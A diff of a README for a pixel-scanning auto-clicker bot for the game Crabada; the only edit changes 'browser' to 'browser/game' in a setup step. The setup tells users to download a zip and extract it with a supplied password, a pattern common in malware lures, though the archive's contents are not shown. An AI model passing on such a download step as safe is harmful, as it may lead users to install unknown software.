@@ -13,7 +13,7 @@ Full auto clicker bot for Crabada. Script uses pixel scanning via WinAPI functio
 
 ### Setup
 - [Download](https://github.com/EDavis66/crabada-auto-clicker/archive/refs/heads/main.zip) repository and extract files with password `9InkwZWOENdE`
-- Launch browser in fullscreen mode (F11)
+- Launch browser/game in fullscreen mode (F11)
 - Launch bot with mode you need
 
 ### Copyright
